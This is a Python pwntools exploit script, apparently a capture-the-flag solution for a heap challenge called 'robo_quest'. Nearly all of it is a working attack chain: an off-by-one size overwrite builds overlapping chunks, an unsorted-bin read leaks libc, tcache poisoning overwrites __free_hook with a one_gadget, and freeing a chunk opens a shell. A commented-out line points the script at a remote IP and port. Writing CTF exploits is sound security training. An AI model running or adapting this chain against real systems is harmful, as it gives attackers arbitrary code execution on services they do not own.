from pwn import *

target = process('./robo_quest')

pid = gdb.attach(target, "\nb *create_question\nb *show_question+172\nb *modify_question+222\nb *remove_question\n set disassembly-flavor intel\ncontinue")

#target = remote('139.59.174.208', 31412)

libc = ELF('.glibc/libc.so.6')
def create_question(size, content):
	print(target.recvuntil(b'4. Remove'))

	target.sendline(b'1')

	print(target.recvuntil(b'Question\'s size:'))

	target.sendline(str(size))

	print(target.recvuntil(b'here:'))

	target.sendline(content)


def modify_question(question_id, content):
	print(target.recvuntil(b'4. Remove'))

	target.sendline(b'3')

	print(target.recvuntil(b'Question\'s id:'))

	target.sendline(str(question_id))

	print(target.recvuntil(b'question:'))

	target.sendline(content)

def show_question(question_id):
	print(target.recvuntil(b'4. Remove'))

	target.sendline(b'2')

	print(target.recvuntil(b'Question\'s id:'))

	target.sendline(str(question_id))
    
def remove_question(question_id):
	print(target.recvuntil(b'4. Remove'))

	target.sendline(b'4')

	print(target.recvuntil(b'Question\'s id:'))

	target.sendline(str(question_id))
    
create_question(0x18, b'a' * 0x18)
create_question(0x18, b'b' * 0x18)
create_question(0x98, b'c' * 0x98)
create_question(0x98, b'd' * 0x98)
create_question(0x98, b'e' * 0x98)
create_question(0x98, b'f' * 0x98)
create_question(0x98, b'g' * 0x98)
create_question(0x98, b'h' * 0x98)
create_question(0x98, b'i' * 0x98)
create_question(0x98, b'j' * 0x98)
modify_question(0, b'0' * 0x18 + b'\x51')
remove_question(1)
remove_question(3)
remove_question(4)
remove_question(5)
remove_question(6)
remove_question(7)
remove_question(8)
remove_question(9)
#This one is going in the unsorted bin so that I can look at the libc addresses
remove_question(2)
create_question(0x48, b'e' * 0x1f)
show_question(1)
print(target.recvuntil(b'e' * 27 + b'\n'))
libc_leak_bytes = target.recv(6)
libc_leak = u64(libc_leak_bytes + b'\x00' * 2)
print(hex(libc_leak))
system_libc = libc_leak - 0x39c750
print(hex(system_libc))
libc_base = system_libc - libc.symbols['system']
onegadget = libc_base + 0x4f432 #0x4f3d5
print(hex(onegadget))
free_hook = libc_base + libc.symbols['__free_hook']
print(hex(free_hook))

#I found that we had a tendency to error out if I leave the libc leaking chunk damaged, so I modify it back to normal.

modify_question(1, b'z' * 0x18 + p64(0x61) + p64(libc_leak)[:6])

create_question(0x58, b'0' * 0x58)

create_question(0x38, b'1' * 0x38) #ID is 3
create_question(0x38, b'2' * 0x38) #ID is 4
create_question(0x38, b'3' * 0x38) #ID is 5
create_question(0x38, b'4' * 0x38) #ID is 6
show_question(3)
modify_question(3, b'z' * 0x38 + b'\x51')
remove_question(4)
remove_question(6)
remove_question(5)
create_question(0x48, b'x' * 0x38 + p64(0x41) + p64(free_hook))
create_question(0x38, b'A' * 0x38)
#This will overwrite the free hook with the onegadget.
create_question(0x38, p64(onegadget))

#This will trigger the free hook and the onegadget and pop a shell.
remove_question(0)

target.interactive()
